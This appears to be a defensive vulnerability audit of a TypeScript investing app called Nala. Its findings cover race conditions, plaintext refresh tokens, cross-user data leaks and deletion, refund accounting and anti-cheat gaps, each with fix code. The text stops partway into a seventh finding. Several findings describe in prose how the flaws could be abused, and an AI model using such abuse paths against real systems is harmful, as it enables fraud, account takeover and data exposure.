# Nala Security Audit — Vulnerability Report

---

## File 1: `src/services/portfolio.service.ts`

**Audited:** 2026-03-01
**Role:** Holdings mutations, portfolio assembly, cost basis math

---

### [Severity: Critical]

**Location:** `upsertHolding()`, lines 22–56 — TOCTOU race on free-tier limit

**The Problem:** The free-tier holding limit check reads the count, then creates. Two concurrent requests can both read `count = 9`, both pass the `>= 10` check, and both create — resulting in 11 holdings. This is a classic time-of-check-to-time-of-use (TOCTOU) race. There's no transaction or unique constraint preventing it.

**The Consequence:** Free-tier users can bypass the 10-holding limit by sending rapid parallel requests (e.g., importing a CSV with 15 tickers). This undermines the billing model — users get paid-tier capacity on a free account.

**The Fix:** Wrap the count check + create in a serialized transaction:
```typescript
await prisma.$transaction(async (tx) => {
  const currentCount = await tx.holding.count({ where: { userId: uid } });
  if (currentCount >= 10) throw new PlanLimitError(10, 'free');
  return tx.holding.create({ data: { ticker, shares: input.shares, averageCost: input.averageCost, userId: uid } });
});
```

---

### [Severity: High]

**Location:** `getPortfolio()`, lines 314–317 — Options mutate `holdingsValue` and `totalCost` AFTER those variables were already used to compute portfolio totals

**The Problem:** Lines 270–284 compute `totalAssets`, `netEquity`, `totalPL`, `totalPLPercent`, `dayChange`, and `dayChangePercent` using `holdingsValue` and `totalCost`. But then lines 314–317 mutate those same variables when processing options. The returned `holdingsValue` and `totalCost` reflect options, but `totalPL`, `totalPLPercent`, `dayChange`, `dayChangePercent`, `totalAssets`, and `netEquity` were computed BEFORE options were added.

**The Consequence:** For any user holding options, the portfolio summary numbers are internally inconsistent. `totalPL` won't match `holdingsValue - totalCost`. `totalAssets` will be lower than `holdingsValue + cash`. The UI may show a portfolio value of $100K (correct, includes options) but a P/L that's missing $15K of option gains.

**The Fix:** Move the portfolio summary calculations (lines 268–284) to AFTER the options processing block. Compute `totalAssets`, `totalPL`, etc. once, using the final `holdingsValue` and `totalCost` that include both equities and options.

---

### [Severity: High]

**Location:** `upsertHolding()`, lines 26–33 — Unconditional overwrite with no cost-basis blending

**The Problem:** When a holding already exists, the function blindly overwrites `shares` and `averageCost` with whatever the caller provides. There's no weighted-average cost basis recalculation. If the caller sends `{ ticker: 'AAPL', shares: 15, averageCost: 200 }` for a user who already holds 10 shares at $150, the history is destroyed — the $150 cost basis is gone forever.

**The Consequence:** Any import flow or manual edit that calls `upsertHolding` with new data silently destroys the user's original cost basis. This affects P/L calculations, tax-loss harvesting recommendations, and performance tracking. The user sees incorrect gain/loss numbers with no way to recover.

**The Fix:** Either (a) implement weighted-average blending in the service (`newAvgCost = (existingShares * existingAvgCost + newShares * newAvgCost) / totalShares`), or (b) make the caller responsible and add a `mode: 'replace' | 'add'` parameter so the destructive overwrite is intentional and explicit rather than the silent default.

---

### [Severity: Medium]

**Location:** `getPortfolio()`, lines 214–216, 249 — Zero-price fallback silently creates phantom losses

**The Problem:** When no quote is available, `currentPrice` falls back to `0`. The `hasValidPrice` check correctly skips P/L calculation, but `totalCost` at line 249 is ALWAYS accumulated regardless of `hasValidPrice`.

**The Consequence:** If a quote API is temporarily down, `totalCost` includes the holding's cost but `holdingsValue` excludes its market value. The portfolio shows a phantom loss (e.g., `totalPL = $0 - $15,000 = -$15,000`). The user sees a massive red number that isn't real.

**The Fix:** Only accumulate `totalCost` inside the `if (hasValidPrice)` block (move line 249 into lines 238–248), so cost and value stay paired.

---

### [Severity: Medium]

**Location:** `deleteHolding()`, lines 58–65 — No cascade cleanup of related data

**The Problem:** Deleting a holding only removes the `Holding` row. It doesn't clean up related `PortfolioTrade` records, `LedgerEvent` entries, `HoldingSnapshot` data, lot records, or dividend reinvestment records for that ticker.

**The Consequence:** Orphaned data pollutes ledger replay, chart reconstruction, and tax harvesting. The chart history may still show the deleted ticker's contribution, and tax-loss harvesting may recommend selling a stock the user no longer holds.

**The Fix:** Either cascade-delete related records (trades, lots, snapshots for that ticker/user), or soft-delete the holding (add a `deletedAt` timestamp) so historical data remains valid while the holding is hidden from the active portfolio.

---

### [Severity: Medium]

**Location:** `upsertHolding()`, lines 18–56 — No validation on `shares` or `averageCost` inputs

**The Problem:** The function accepts any numeric values without validation. Negative shares, zero average cost, `NaN`, or `Infinity` are all stored directly in the database.

**The Consequence:** A negative-share holding creates nonsensical P/L values. Zero average cost produces division-by-zero in P/L percent calculations. `NaN` propagates through every calculation that touches this holding, turning the entire portfolio summary into `NaN`.

**The Fix:**
```typescript
if (!Number.isFinite(input.shares) || input.shares <= 0) throw new Error('shares must be positive');
if (!Number.isFinite(input.averageCost) || input.averageCost <= 0) throw new Error('averageCost must be positive');
```

---

### [Severity: Low]

**Location:** `getSettings()`, lines 92–95 — Silent swallow of all errors, not just FK constraint

**The Problem:** The catch block catches ALL errors and returns default settings. A transient database connection error or Prisma bug would be silently hidden — the user gets `cashBalance: 0` instead of an error.

**The Consequence:** If the database is intermittently failing, the user sees their cash balance as $0 with no indication anything is wrong.

**The Fix:** Catch specifically the FK constraint error (Prisma error code `P2003`) and rethrow everything else:
```typescript
catch (e: any) {
  if (e?.code === 'P2003') {
    return { id: 'default', cashBalance: 0, marginDebt: 0, cashInterestRate: 0 } as Settings;
  }
  throw e;
}
```

---

## File 2: `src/services/auth.service.ts`

**Audited:** 2026-03-01
**Role:** Token generation, refresh rotation, password hashing, session security, email OTP

---

### [Severity: High]

**Location:** `generateRefreshToken()`, lines 106–117 — Refresh tokens stored in plaintext in the database

**The Problem:** The refresh token is stored as raw hex in the `refreshToken` table. If an attacker gains read access to the database (SQL injection, backup leak, compromised admin panel, Prisma Accelerate misconfiguration), every stored refresh token is immediately usable. They can call `/auth/refresh` with any token and get a valid access token for that user.

**The Consequence:** A single database read breach becomes full account takeover for every user with an active session. The attacker doesn't need to crack anything — the tokens are ready to use as-is.

**The Fix:** Store a SHA-256 hash of the token instead of the raw value. On creation, hash before storing. On lookup, hash the incoming token and query by hash:
```typescript
import { createHash } from 'crypto';
const tokenHash = createHash('sha256').update(token).digest('hex');
// Store tokenHash in DB, return raw token to client
// On rotation: hash incoming token, findUnique by tokenHash
```

---

### [Severity: High]

**Location:** `changePassword()`, lines 370–397 — Does not revoke existing sessions after password change

**The Problem:** After successfully changing a password, no refresh tokens are revoked. All existing sessions across all devices continue working indefinitely. Compare with `resetPasswordWithCode()` (line 794) which correctly revokes all tokens. The two password-change paths have inconsistent security behavior.

**The Consequence:** If a user changes their password because they suspect their account is compromised, the attacker's existing session remains valid until the refresh token naturally expires. The user believes they've secured their account, but they haven't.

**The Fix:** Add `revokeAllRefreshTokens(userId)` after the password update at line 394:
```typescript
await prisma.user.update({ where: { id: userId }, data: { passwordHash } });
await revokeAllRefreshTokens(userId);
return { success: true };
```

---

### [Severity: Medium]

**Location:** `issueEmailVerificationCode()` lines 33–36, `issuePasswordResetCode()` lines 54–57 — Email verification and password reset OTPs share the same table with no type discriminator

**The Problem:** Both functions invalidate ALL unused `emailOtpCode` entries for the user (`where: { userId, usedAt: null }`). There's no `purpose` column to distinguish verification codes from reset codes. If a user requests a password reset and then triggers an email verification resend (or vice versa), the first code is silently invalidated.

**The Consequence:** User clicks "Reset Password", gets a 6-digit code. Then the app triggers an automatic email verification resend. The password reset code is now dead. User enters their reset code, gets "Invalid or expired." They're locked out and frustrated, with no idea why.

**The Fix:** Add a `purpose` column to `emailOtpCode` (`'email_verification' | 'password_reset'`), and scope the invalidation:
```typescript
await prisma.emailOtpCode.updateMany({
  where: { userId, usedAt: null, purpose: 'email_verification' },
  data: { usedAt: new Date() },
});
```

---

### [Severity: Medium]

**Location:** `rotateRefreshToken()`, line 169 — Hardcoded 50ms sleep as a race condition workaround

**The Problem:** When two concurrent requests try to rotate the same token, the loser waits 50ms then looks for the winner's newly created token. If the winner's database write takes longer (network latency, DB contention, Railway cold start), the loser finds nothing and returns `null` — the user is logged out.

**The Consequence:** Under load or high latency, users experience random session loss. The app refreshes, gets a 401, redirects to login. Intermittent and hard to reproduce.

**The Fix:** Remove the sleep. The `revoked.count === 0` branch can use the same query as the revoked-token branch (lines 143–157) without delay — since `updateMany` returning 0 means the other request already committed the revocation, the new token should also be committed:
```typescript
if (revoked.count === 0) {
  const latestValid = await prisma.refreshToken.findFirst({
    where: { userId: stored.userId, family: tokenFamily, revokedAt: null, expiresAt: { gt: new Date() } },
    orderBy: { createdAt: 'desc' },
  });
  if (!latestValid) return null;
  // ... return accessToken + latestValid.token
}
```

---

### [Severity: Medium]

**Location:** `signup()`, lines 468–483 — TOCTOU race on username and email uniqueness checks

**The Problem:** The uniqueness checks (`findUnique` for username and email) run OUTSIDE the transaction at lines 487–529. Two concurrent signups with the same username: both pass the check, one `create` succeeds, the other throws a Prisma unique constraint violation (`P2002`). This uncaught error surfaces as a 500 Internal Server Error.

**The Consequence:** Under concurrent signup attempts (bots, double-clicks), users see a generic "Internal Server Error" instead of "Username already taken." Also triggers false Sentry alerts.

**The Fix:** Catch the `P2002` error and return a user-friendly response:
```typescript
try {
  const user = await prisma.$transaction(async (tx) => { /* ... */ });
} catch (e: any) {
  if (e?.code === 'P2002') return null;
  throw e;
}
```

---

### [Severity: Low]

**Location:** `generateToken()`, lines 97–101 — Legacy 7-day JWT still exported

**The Problem:** `generateToken()` creates JWTs with 7-day expiry — far longer than the 15-minute `generateAccessToken()`. If any code path still calls this function, users get long-lived tokens that bypass the short-lived access + refresh rotation security model.

**The Consequence:** A stolen 7-day token gives an attacker a week-long window instead of 15 minutes.

**The Fix:** Grep for callers. If none remain in production code, delete it. If callers exist, migrate them to `generateAccessToken()` + refresh token pair.

---

### [Severity: Low]

**Location:** `generateEmailOtpCode()`, line 25 — Off-by-one: code 999999 is never generated

**The Problem:** `crypto.randomInt(100000, 999999)` generates 100000–999998 (upper bound exclusive). Code 999999 never appears.

**The Consequence:** No practical security impact (899,999 out of 900,000 codes), but signals wrong semantics.

**The Fix:** `crypto.randomInt(100000, 1000000)` to include 999999.

---

### [Severity: Low]

**Location:** `issueEmailVerificationCode()` line 44, `issuePasswordResetCode()` line 65 — Email send failures silently swallowed

**The Problem:** If the Resend API call fails, the OTP code is created in the DB but the user never receives it. The catch block logs a one-line error but the function returns normally.

**The Consequence:** User clicks "Resend verification email," sees a success toast, but never gets the email. They resend again (counts against rate limit), still nothing. Stuck in an unverifiable state.

**The Fix:** Propagate the error so the caller can return a "failed to send" response, or return a status from these functions.

---

## File 3: `src/services/snapshot.service.ts`

**Audited:** 2026-03-01
**Role:** Snapshot creation, chart reconstruction, leaderboard refresh, duplicate cleanup, intraday gap-fill

---

### [Severity: Critical]

**Location:** `cleanupDuplicateSnapshots()`, lines 1262–1324 — Cross-user snapshot deletion due to shared `lastKeptTimestamp`

**The Problem:** The function uses a single `lastKeptTimestamp` variable (line 1265) initialized to `0` and processes ALL users' snapshots in a single global pass. The query `where: { userId: { not: undefined } }` fetches snapshots for every user, ordered by timestamp. The dedup logic compares each snapshot's timestamp against `lastKeptTimestamp` — which was set by the PREVIOUS user's kept snapshot. When User A's snapshot at 10:00:00 is kept (setting `lastKeptTimestamp = 10:00:00`), User B's perfectly valid snapshot at 10:02:00 is marked for deletion because it falls within the interval window.

**The Consequence:** Running this cleanup function silently deletes snapshots belonging to other users. A user could lose weeks or months of chart history because another user's snapshot happened to be timestamped close to theirs. The deletion is permanent — there's no undo.

**The Fix:** Partition by `userId`. Either run the cleanup per-user with a separate `lastKeptTimestamp` per user, or track a `Map<userId, number>` for the last kept timestamp:
```typescript
const lastKeptByUser = new Map<string, number>();
for (const snapshot of snapshots) {
  const snapshotTime = new Date(snapshot.timestamp).getTime();
  const lastKept = lastKeptByUser.get(snapshot.userId) ?? 0;
  if (snapshotTime - lastKept < intervalMs) {
    toDelete.push(snapshot.id);
  } else {
    lastKeptByUser.set(snapshot.userId, snapshotTime);
  }
}
```

---

### [Severity: High]

**Location:** `getRecentHoldingSnapshots()`, lines 352–376 — No userId filter leaks all users' holding data

**The Problem:** This function queries the `HoldingSnapshot` table with no `userId` filter. The raw SQL at line 359 (`SELECT DISTINCT date(timestamp / 1000, 'unixepoch') AS d FROM HoldingSnapshot`) scans ALL users' holding snapshots. The subsequent Prisma query (line 370) also has no `userId` constraint. The returned data includes `ticker`, `dayPL`, `dayPLPercent`, and `timestamp` for every user in the system.

**The Consequence:** If this function is called from any user-facing endpoint (e.g., a momentum heatmap or leaderboard), it exposes every user's per-holding P/L data. An attacker could infer other users' positions, trade timing, and portfolio composition.

**The Fix:** Add a `userId` parameter and filter both queries:
```typescript
export async function getRecentHoldingSnapshots(userId: string, days: number = 5) {
  const recentDates = await prisma.$queryRaw<{ d: string }[]>`
    SELECT DISTINCT date(timestamp / 1000, 'unixepoch') AS d
    FROM HoldingSnapshot
    WHERE snapshotId IN (SELECT id FROM PortfolioSnapshot WHERE userId = ${userId})
    ORDER BY d DESC LIMIT ${days}
  `;
  // ... filter subsequent query by userId too
}
```

---

### [Severity: Medium]

**Location:** `createSnapshotIfNeeded()` + `resetSnapshotsForCompositionChange()`, lines 47–76 — Global `lastSnapshotTime` shared across all users

**The Problem:** The module-level `lastSnapshotTime` (line 47) is a single number shared by ALL users. When any user's snapshot is created, it updates this global timestamp. All other users' snapshot creation is then blocked until the interval expires. Conversely, `resetSnapshotsForCompositionChange()` (line 75) sets `lastSnapshotTime = 0` globally — when User A changes their portfolio, the snapshot timer resets for User B, User C, and every other user.

**The Consequence:** In a multi-user system: (1) User B's snapshot may be blocked for minutes because User A just created one. (2) One user's portfolio change triggers immediate snapshot creation for all users on the next request, creating unnecessary load. The DB double-check (lines 96–108) partially mitigates this, but only for the "blocked" case — the "premature reset" case still causes extra DB queries and potential duplicate snapshots.

**The Fix:** Use a per-user timestamp map (similar to `userSnapshotLocks` at line 714):
```typescript
const snapshotLocks = new Map<string, number>(); // userId -> lastSnapshotTime
// In createSnapshotIfNeeded:
const lastTime = snapshotLocks.get(userId) ?? 0;
if (now - lastTime < intervalMs) return null;
```

---

### [Severity: Medium]

**Location:** `refreshLeaderboardSnapshots()`, lines 860–888 — totalCost/holdingsValue mismatch creates phantom P/L in snapshots

**The Problem:** `totalCost` is unconditionally accumulated for ALL holdings (line 867: `totalCost += h.shares * h.averageCost`), but `holdingsValue` only accumulates for holdings with a valid price > 0 (lines 873–881). If any ticker's quote is temporarily unavailable, `totalCost` includes that ticker's cost basis but `holdingsValue` excludes its market value. The resulting `totalPL = holdingsValue - totalCost` (line 888) records a phantom loss.

**The Consequence:** A leaderboard user's snapshot permanently records incorrect P/L if even one of their holdings lacks a quote at refresh time. Since snapshots are the source of truth for chart history, a single bad refresh poisons the chart with a phantom dip. The user appears to have lost money they didn't lose, and the chart spike/dip persists forever.

**The Fix:** Only accumulate `totalCost` for holdings that also have a valid price:
```typescript
for (const h of userHoldings) {
  const price = /* ... */;
  if (price <= 0) continue;
  totalCost += h.shares * h.averageCost;
  holdingsValue += h.shares * price;
  // ...
}
```

---

### [Severity: Medium]

**Location:** `reconstructPortfolioHistoryHiRes()`, lines 648–672 — 5% outlier smoothing silently fabricates chart data

**The Problem:** Any data point that deviates more than 5% from the average of its two neighbors is replaced with the interpolated neighbor average. This is applied indiscriminately — legitimate market moves (earnings gaps, FDA decisions, flash crashes) are smoothed away. Lines 663–672 are especially dangerous: they replace the LAST point in the array (the most recent value) if it deviates >5% from the second-to-last point. This means the current portfolio value shown on the chart can be a fabricated number.

**The Consequence:** A user who holds NVDA through an 8% earnings gap sees a smoothed chart that hides the real move. A 12% crash gets turned into a gradual decline. The "current" portfolio value at the right edge of the chart may not match the actual portfolio value shown in the header — because the chart's last point was replaced with yesterday's value.

**The Fix:** Either remove the outlier smoothing entirely (show real data with a tooltip explaining volatility), or increase the threshold significantly (>25% for intraday, matching the daily chart's 3× threshold at line 288). At minimum, never smooth the last point — it should always show the real current value.

---

### [Severity: Low]

**Location:** `createSnapshotIfNeeded()`, lines 88–92 — In-memory mutex is process-local, not multi-instance safe

**The Problem:** `isCreatingSnapshot` is a module-level boolean. If Railway scales to multiple API instances (or uses PM2/cluster mode), each instance has its own copy. Two instances receiving concurrent requests will both pass the mutex check and both create snapshots.

**The Consequence:** Duplicate snapshots under horizontal scaling. The DB double-check (lines 96–108) reduces but doesn't eliminate the window — both instances can read "no recent snapshot" before either writes.

**The Fix:** For true multi-instance safety, use a database advisory lock or an atomic `INSERT ... ON CONFLICT` pattern. For the current single-instance Railway deployment, this is acceptable but should be noted for future scaling.

---

## File 4: `src/services/ledger/replay.service.ts`

**Audited:** 2026-03-01
**Role:** Trade + ledger event replay into daily account-state snapshots for chart reconstruction

---

### [Severity: Medium]

**Location:** `replayDailyLedger()`, lines 91–117 — No `take` limit on trade/event queries

**The Problem:** The Prisma queries fetch ALL trades and ledger events for a user up to `rangeEnd` with no row limit. A user with 6 years of daily trading history (thousands of trades + ledger events) loads everything into memory at once. The function then creates a `DailyLedgerSnapshot` for every calendar day in the range (including weekends/holidays), each with a cloned `Map` of all positions.

**The Consequence:** A power user with a large trade history requesting a long-range chart (e.g., `ALL` = 1825 days) triggers: (1) a large unbounded DB read, (2) 1825 Map clones with N tickers each, and (3) the caller (`reconstructPortfolioHistoryFromLedgerWithDiagnostics`) then fetches candles for every ticker. Under concurrent requests from multiple users, this could exhaust server memory.

**The Fix:** Add a `take` limit to the queries (e.g., `take: 50000`) and skip weekend days in the snapshot loop:
```typescript
// Skip weekends — no market activity
const dow = day.getUTCDay();
if (dow === 0 || dow === 6) continue;
```

---

### [Severity: Medium]

**Location:** `replayDailyLedger()`, lines 224–236 — Sell with shares exceeding position silently zeroes out without logging

**The Problem:** When a sell posting has more shares than the current position (e.g., selling 100 shares when only 50 are held), `current.shares -= posting.shares` goes negative, hits the `<= 0.000001` check, and the position is deleted. No warning is logged. This can happen legitimately (partial data, out-of-order imports) or indicate data corruption in the trade history.

**The Consequence:** A silent over-sell masks data import errors. The user's replayed chart silently diverges from reality — the position disappears entirely instead of showing the correct remaining shares. Since this feeds into chart valuation, the resulting chart can show incorrect portfolio values with no diagnostic trace.

**The Fix:** Log a warning when shares go negative, and record it as a gap in the replay diagnostics:
```typescript
if (current.shares - posting.shares < -0.001) {
  console.warn(`[Replay] Over-sell: ${posting.ticker} held=${current.shares} sold=${posting.shares}`);
}
```

---

### [Severity: Low]

**Location:** `replayDailyLedger()`, lines 252–256 — Cash can go unbounded negative

**The Problem:** `cash += posting.deltaCash` has no floor. If trades are imported out of order, or deposit events are missing, `cash` can go deeply negative (e.g., `-$50,000`). Margin has a `if (margin < 0) margin = 0` guard (line 256), but cash does not. Negative cash then feeds into `equity = cash - margin + sumCostBasis(clonedPositions)`, producing an artificially low equity value.

**The Consequence:** A user who imports trades without corresponding deposit records sees a chart showing massively negative equity in early periods, gradually recovering as sell proceeds come in. The chart looks like the user started with -$50K when in reality they simply deposited money that wasn't recorded.

**The Fix:** Either clamp cash at 0 (like margin) or, better, track negative cash as a diagnostic signal and include it in the confidence scoring upstream.

---

### [Severity: Low]

**Location:** `replayDailyLedger()`, lines 128–131 — Settlement policy overridden silently for charts

**The Problem:** The code declares `TRADE_SETTLEMENT_POLICY[buy].cashPosting = 'settleDate'` but then hardcodes `const settleMs = effectiveMs` on line 131, effectively ignoring the policy. The comment explains this is intentional (to avoid false dips), but the policy file is the documented source of truth. A future developer reading the policy file would expect T+1 settlement behavior and not find it.

**The Consequence:** No runtime impact (the override is correct for chart purposes), but the divergence between declared policy and actual behavior creates a maintenance trap. If someone changes the settlement policy expecting it to be honored, it will be silently ignored for trades.

**The Fix:** Either add a parameter `useSettlement: boolean` to let the caller choose, or document the override prominently in the settlement policy file itself.

---

## File 5: `src/utils/finance-math.ts`

**Audited:** 2026-03-01
**Role:** TWR, XIRR, Beta, Correlation, Volatility, Drawdown, anti-cheat checks for leaderboard

---

### [Severity: High]

**Location:** `calculateTWR()`, line 67 — $0.01 floor creates massively inflated returns

**The Problem:** When a cashflow causes `valueBeforeCF + cf.amount <= 0` (e.g., a near-total withdrawal), `periodStartValue` is floored to `0.01`. The next sub-period then computes a return relative to $0.01. If the portfolio recovers to $1,000, the sub-period return is 100,000×, which multiplies into the final TWR product. A single legitimate withdrawal that temporarily exceeds the portfolio value turns the TWR into an astronomical number.

**The Consequence:** A user who withdraws most of their portfolio and then deposits again sees a TWR of +100,000% or more. On the leaderboard, this user appears as the top performer by a massive margin. On the benchmark comparison page, the portfolio shows impossible returns. The anti-cheat checks (`isSuspiciousReturn`, `isSuspiciousSharpe`) operate on daily returns, not TWR, so they don't catch this.

**The Fix:** When `periodStartValue` would go to zero or negative, end the TWR chain and restart from the next valid snapshot. This is the standard approach when the portfolio is fully withdrawn:
```typescript
if (periodStartValue <= 0) {
  // Portfolio was fully withdrawn — start a new TWR chain
  // Find next snapshot with positive value
  while (snapshotIdx < sorted.length && sorted[snapshotIdx].value <= 0) snapshotIdx++;
  if (snapshotIdx < sorted.length) periodStartValue = sorted[snapshotIdx].value;
  else break;
  continue;
}
```

---

### [Severity: Medium]

**Location:** `maxDrawdown()`, lines 270–283 — Division by zero when peak is zero

**The Problem:** If the first value (or any peak) is `0`, line 278 computes `(peak - v) / peak` = `0 / 0` = `NaN`. The `NaN` propagates through the comparison `dd > maxDD` (always false), so the function returns `0` — hiding the real drawdown. If the first value is negative (possible with margin), `peak` stays negative, and `(peak - v) / peak` produces nonsensical ratios.

**The Consequence:** A portfolio that starts at $0 (or negative due to margin) and drops further shows `maxDrawdown = 0` — claiming no drawdown ever occurred. The benchmark comparison report and projection service both consume this, displaying incorrect risk metrics.

**The Fix:**
```typescript
if (values.length < 2) return 0;
let peak = values[0];
if (peak <= 0) return 0; // Cannot compute drawdown from zero/negative base
let maxDD = 0;
for (const v of values) {
  if (v > peak) peak = v;
  if (peak > 0) {
    const dd = (peak - v) / peak;
    if (dd > maxDD) maxDD = dd;
  }
}
return maxDD;
```

---

### [Severity: Medium]

**Location:** `isSuspiciousReturn()`, lines 330–336 — Leaderboard anti-cheat is trivially bypassable

**The Problem:** The function only flags single-day returns > 300%. Multi-day fabrication is unchecked. A user who adds a holding with `averageCost: $0.01` (since `upsertHolding` has no validation — see File 1 finding) and a current price of $200 would show 2,000,000% total return without triggering the single-day check. Also, `isSuspiciousSharpe` checks Sharpe > 5, but Sharpe of 4.9 is still unrealistically high (Medallion Fund averages ~3.5).

**The Consequence:** A user can manipulate their leaderboard position by entering fake cost basis values. The leaderboard shows them as the top performer with thousands-of-percent returns, undermining credibility for all users.

**The Fix:** Add cumulative return checks and tighten the Sharpe threshold:
```typescript
export function isSuspiciousReturn(returnPct: number, days: number): boolean {
  if (days <= 1 && Math.abs(returnPct) > 300) return true;
  if (days <= 30 && Math.abs(returnPct) > 500) return true;
  if (days <= 365 && Math.abs(returnPct) > 2000) return true;
  return false;
}
```

---

### [Severity: Low]

**Location:** `calculateXIRR()`, lines 144–163 — Bisection fallback searches narrow range [-0.5, 5.0]

**The Problem:** If Newton-Raphson diverges, the bisection fallback searches for roots in the range [-50%, +500%]. Extreme losses (XIRR of -80%) or extreme gains (XIRR of +600%) fall outside this range. The function returns the midpoint of `lo` and `hi` at line 163 regardless of convergence — a potentially inaccurate guess presented as an exact answer.

**The Consequence:** For users with extreme performance, the XIRR metric is silently wrong. A portfolio that lost 80% shows an XIRR much closer to -50% than reality. No error indicator is returned.

**The Fix:** Expand the bisection range to `[-0.95, 10.0]` and return `null` if the final `npv(mid)` is above tolerance instead of returning the midpoint unconditionally.

---

### [Severity: Low]

**Location:** `calculateCorrelation()`, line 173 vs. 179 — JSDoc says "< 20 points" but code uses `< 10`

**The Problem:** The JSDoc comment says "Returns null if insufficient data (< 20 points)" but the actual check is `if (len < 10) return null`. 10 data points produce statistically unreliable correlation coefficients (confidence interval is extremely wide).

**The Consequence:** The benchmark comparison page may display correlation and beta values that are statistically meaningless. A user sees "Beta: 1.4" computed from 11 data points and makes portfolio decisions based on it.

**The Fix:** Either update the threshold to 20 (as documented) or update the JSDoc. For financial statistics, 20–30 minimum data points is standard.

---

## File 6: `src/services/creator-billing.service.ts`

**Audited:** 2026-03-01
**Role:** Stripe Connect checkout, subscriptions, webhook handling, refunds, disputes, creator payouts — real money

---

### [Severity: High]

**Location:** `charge.refunded` handler, lines 409–479 — Uses cumulative `amount_refunded`, double-debits creator on partial+full refund sequences

**The Problem:** Line 422 reads `charge.amount_refunded`, which is the **cumulative** total refunded for the charge, not the incremental amount of this specific refund. If a subscriber receives a partial refund ($5) and later a full refund (additional $5 to total $10), Stripe sends two `charge.refunded` events:
- Event 1: `amount_refunded = 500` → creator debited `Math.round(500 * 0.8) = 400`
- Event 2: `amount_refunded = 1000` → creator debited `Math.round(1000 * 0.8) = 800`
- Total creator debit: 1,200 cents. Correct amount: 800 cents (80% of $10).

The `markWebhookProcessed` idempotency (line 207) correctly prevents the SAME event from being processed twice, but two DIFFERENT events for the same charge are each processed using the cumulative total.

**The Consequence:** Creator loses 50% more than they should on any partial→full refund sequence. With real money flowing through Stripe Connect, this silently drains creator wallets. The creator sees incorrect ledger entries with no way to dispute them within the app.

**The Fix:** Track the incremental refund amount by checking existing refund ledger entries for this charge:
```typescript
const previousRefunds = await prisma.creatorWalletLedger.findMany({
  where: {
    creatorUserId: sub.creatorUserId,
    description: { startsWith: `stripe_event:` },
    type: 'refund',
    subscriptionId: sub.id,
  },
  select: { amountCents: true },
});
const previouslyRefunded = previousRefunds.reduce((sum, r) => sum + Math.abs(r.amountCents), 0);
const incrementalRefund = Math.round(amountRefunded * 0.8) - previouslyRefunded;
if (incrementalRefund <= 0) return; // Already fully accounted for
```

---

### [Severity: Medium]

**Location:** `requestPayout()`, lines 688–730 — TOCTOU race allows double-drain of creator balance

**The Problem:** The function checks `pendingCount > 0` (line 698) and `availableCents` (line 703), then creates a payout record and ledger entry. These checks and writes are not wrapped in a transaction. Two concurrent payout requests can both read `pendingCount = 0` and `availableCents = 5000`, then both create payouts — doubling the payout to $100 when only $50 was available.

**The Consequence:** A creator could (intentionally or accidentally via double-click) drain more than their earned balance. The platform would owe Stripe more than the creator has earned, creating a financial liability.

**The Fix:** Wrap the check + create in a serialized transaction with a row-level lock:
```typescript
await prisma.$transaction(async (tx) => {
  const pendingCount = await tx.creatorPayout.count({
    where: { creatorUserId: userId, status: 'pending' },
  });
  if (pendingCount > 0) throw new Error('Existing payout request is still pending');
  // ... recompute availableCents inside tx ...
  await tx.creatorPayout.create({ ... });
  await tx.creatorWalletLedger.create({ ... });
});
```

---

### [Severity: Medium]

**Location:** `charge.dispute.closed` handler (won branch), lines 529–536 — Winning a dispute doesn't restore subscriber access or reverse the $15 fee

**The Problem:** When a dispute is opened (lines 490–508), the handler: (1) sets `status: 'past_due'`, (2) sets `currentPeriodEnd` to past (revoking access), (3) charges a $15 dispute fee to the creator's ledger. When the dispute is WON (lines 529–536), only `status` and `disputedAt` are restored — `currentPeriodEnd` stays in the past, and the $15 fee is never reversed.

**The Consequence:** Even after winning a dispute, the subscriber can't access paid content (because `currentPeriodEnd` is still in the past). The creator permanently loses $15 for a dispute they won. The subscriber likely churns, costing the creator a recurring subscriber over a resolved dispute.

**The Fix:** In the `won` branch, also restore `currentPeriodEnd` and reverse the dispute fee:
```typescript
if (outcome === 'won') {
  // Fetch the subscription from Stripe to get the real current_period_end
  const stripeSub = await stripe.subscriptions.retrieve(sub.stripeSubscriptionId);
  await prisma.creatorSubscription.update({
    where: { id: sub.id },
    data: {
      status: 'active',
      disputedAt: null,
      currentPeriodEnd: new Date(stripeSub.current_period_end * 1000),
    },
  });
  // Reverse the dispute fee
  await prisma.creatorWalletLedger.create({
    data: {
      creatorUserId: sub.creatorUserId,
      type: 'platform_fee',
      amountCents: -1500,
      description: `stripe_event:${event.id}:dispute_fee_reversal`,
    },
  });
}
```

---

### [Severity: Low]

**Location:** `getOrCreateStripeCustomer()`, lines 42–61 — TOCTOU race creates orphaned Stripe customers

**The Problem:** The function checks if `stripeCustomerId` exists, and if not, creates a Stripe customer and updates the DB. Two concurrent requests for the same user can both read `stripeCustomerId = null`, both create Stripe customers, and the second `update` overwrites the first. The first Stripe customer object is orphaned — it exists in Stripe's system but is never used or cleaned up.

**The Consequence:** Orphaned Stripe customer objects accumulate over time. No direct financial impact, but creates confusion in Stripe dashboard and potential issues if Stripe-side customer lookups return the wrong record.

**The Fix:** Use `prisma.user.update` with a conditional check (or `updateMany` with `where: { stripeCustomerId: null }`), and handle the case where another request already set it.

---

### [Severity: Low]

**Location:** `charge.dispute.created` handler, line 503 — $15 dispute fee type is `platform_fee` (positive), semantically misleading

**The Problem:** The dispute fee is recorded as `type: 'platform_fee'` with `amountCents: 1500` (positive). In `getPayoutBalanceFromLedger()`, the `platform_fee` type is ignored entirely — it doesn't affect the creator's payout balance. The $15 fee is recorded but has no financial effect on the creator's actual balance.

**The Consequence:** The dispute fee is purely cosmetic — it appears in the ledger but doesn't actually reduce the creator's available payout. If the intent is to charge creators for disputes, it doesn't work. If the intent is just to log it, the `platform_fee` naming implies a real deduction.

**The Fix:** If the fee should reduce the creator's balance, change the type to a value that `getPayoutBalanceFromLedger` recognizes (e.g., add `'dispute_fee'` to the deduction set). If it's just for logging, rename or add a comment clarifying it has no balance impact.

---

## File 7: `src/middleware/auth.middleware.ts` + `src/controllers/auth.controller.ts` (cookie security)

**Audited:** 2026-03-01
**Role:** JWT validation middleware, cookie security attributes, ownership enforcement

---

### [Severity: Medium]

**Location:** `isCapacitorRequest()` in both `auth.middleware.ts` line 7 and `auth.controller.ts` line 52 — Client-controlled header downgrades cookie sameSite to `none`

